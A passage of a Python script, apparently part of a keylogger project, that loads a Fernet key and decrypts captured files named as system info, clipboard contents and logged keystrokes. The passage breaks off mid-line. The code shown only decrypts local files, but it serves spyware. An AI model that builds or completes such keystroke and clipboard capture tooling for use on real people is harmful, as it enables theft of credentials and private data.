from cryptography.fernet import Fernet
import os

# Define paths
base_path = "C:/Users/ktmdu/PycharmProjects/PythonProject/Cryptography/"
encrypted_path = os.path.join(base_path, "encrypted/")
decrypted_path = os.path.join(base_path, "decrypted/")
os.makedirs(decrypted_path, exist_ok=True)

# Load the encryption key
key_path = os.path.join(encrypted_path, "key.key")
if not os.path.exists(key_path):
    print("[ERROR] Encryption key not found! Run GenerateKey.py first.")
    exit(1)

with open(key_path, "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)

# Define encrypted-to-decrypted file mappings
decrypted_files = {
    "e_system_info.txt": "decrypted_system.txt",
    "e_clipboard.txt": "decrypted_clipboard.txt",
    "e_key_log.txt": "decrypted_keys_logged.txt",
}

# Decrypt each file
for encrypted_file, decrypted_file in decrypted_files.items():
    encrypted_file_path = os.path.join(encrypted_path, encrypted_file)
    decrypted_file_path = os.path.join(decrypted_path, decrypted_file)

    if os.path.exists(encrypted_file_path):
        with open(encrypted_file_path, "rb") as f:
            encrypted_data = f
